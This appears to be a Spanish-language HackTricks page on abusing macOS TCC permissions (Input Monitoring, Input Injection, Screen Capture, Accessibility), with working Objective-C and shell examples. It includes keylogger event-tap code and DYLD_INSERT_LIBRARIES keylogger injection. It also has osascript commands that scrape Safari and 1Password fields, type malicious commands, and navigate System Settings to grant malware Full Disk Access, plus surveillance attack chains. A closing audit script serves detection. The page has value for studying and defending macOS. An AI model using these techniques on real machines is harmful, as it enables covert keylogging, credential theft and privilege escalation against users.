# Abuso de Input Monitoring, Screen Capture y Accessibility en macOS

{{#include ../../../banners/hacktricks-training.md}}

## Descripción general

Tres servicios TCC relacionados controlan cómo las aplicaciones pueden observar e interactuar con la sesión de escritorio del usuario:

| Servicio TCC | Permiso | Capacidad |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | Leer todos los eventos de teclado y ratón de todo el sistema (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | Inyectar eventos sintéticos de teclado y ratón |
| `kTCCServiceScreenCapture` | **Screen Capture** | Leer el búfer de pantalla, tomar capturas de pantalla y grabar la pantalla |
| `kTCCServiceAccessibility` | **Accessibility** | Controlar otras aplicaciones mediante la API AXUIElement y leer elementos de la interfaz de usuario |

Estos permisos son **la combinación más peligrosa en macOS**; juntos proporcionan:
- Keylogging completo de cada pulsación de tecla (contraseñas, mensajes y tarjetas de crédito)
- Grabación de pantalla de todo el contenido visible
- Inyección de entrada sintética (hacer clic en botones y aprobar diálogos)
- Control completo de la GUI, equivalente al acceso físico

---

## Input Monitoring (kTCCServiceListenEvent)

### Cómo funciona

macOS utiliza la API **`CGEventTap`** para permitir que los procesos intercepten eventos de entrada del sistema de eventos Quartz. Un proceso con permiso ListenEvent puede crear un event tap que recibe **cada evento de teclado y ratón** antes o después de que llegue a la aplicación objetivo.<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Búsqueda de binarios con entitlements
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Ataque: Keylogging mediante inyección de código

Si un binario con permiso `ListenEvent` también tiene la **validación de bibliotecas deshabilitada** o **permite variables de entorno DYLD**, un atacante puede inyectar un dylib que registre un `CGEventTap`:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
La dylib inyectada hereda la autorización TCC ListenEvent del objetivo y captura todas las pulsaciones de teclas.

### Attack: Credential Harvesting

Un keylogger sofisticado puede correlacionar las pulsaciones de teclas con la aplicación activa:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Inyección de entrada (kTCCServicePostEvent)

### Cómo funciona

El permiso PostEvent permite crear un event tap con **`kCGEventTapOptionDefault`** (puede modificar o inyectar eventos) en lugar de ListenOnly.<sup>[[1]](#references)</sup> Esto permite:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Ataque: Aprobación automatizada de prompts de TCC

Con PostEvent, un atacante puede **simular hacer clic en "Allow"** en los diálogos de permisos de TCC:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Captura de pantalla (kTCCServiceScreenCapture)

### Cómo funciona

El permiso de captura de pantalla permite leer el búfer de pantalla mediante:
- **`CGWindowListCreateImage`** — captura cualquier ventana o la pantalla completa
- **`ScreenCaptureKit`** (macOS 12.3+) — API moderna para transmitir el contenido de la pantalla<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — captura de pantalla acelerada por hardware
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Encontrando clientes de captura de pantalla
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: Captura de credenciales mediante OCR

Un proceso de captura de pantalla inyectado puede capturar periódicamente fotogramas y utilizar OCR para extraer contraseñas:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> A partir de **macOS Sonoma**, la captura de pantalla muestra un **indicador persistente** en la barra de menús. En versiones anteriores, la grabación de pantalla podía ser completamente silenciosa. Sin embargo, una captura breve de un solo fotograma aún puede pasar desapercibida para los usuarios.

### Ataque: Grabación de sesión

La grabación continua de la pantalla proporciona una reproducción completa de la sesión del usuario:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accesibilidad (kTCCServiceAccessibility)

### Cómo funciona

El acceso de accesibilidad otorga control sobre otras aplicaciones mediante la **AXUIElement API**.<sup>[[2]](#references)</sup> Un proceso con acceso de accesibilidad puede:

1. **Leer** cualquier elemento de la interfaz de usuario en cualquier aplicación (campos de texto, etiquetas, botones, menús)
2. **Hacer clic** en botones e interactuar con controles
3. **Escribir** texto en cualquier campo de texto
4. **Navegar** por menús y diálogos
5. **Extraer** datos mostrados de cualquier aplicación en ejecución
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Ataque: Concederse permisos de TCC

El abuso más peligroso de la accesibilidad es **navegar por Configuración del Sistema para conceder permisos adicionales a tu propio malware**.<sup>[[4]](#references)</sup>
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Ataque: Scraping de datos entre aplicaciones
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Ataque: Acciones automatizadas del usuario
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## Cadenas de ataque

### Cadena: Input Monitoring + Screen Capture = Vigilancia completa
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chain: Accessibility + PostEvent = Control remoto total
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Cadena: Accesibilidad → Autoasignación de permisos de cámara/micrófono → Vigilancia
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Detección y enumeración
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## References

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Eventos sintéticos y seguridad de la interfaz de usuario en macOS](https://objective-see.org/blog/blog_0x36.html)
{{#include ../../../banners/hacktricks-training.md}}
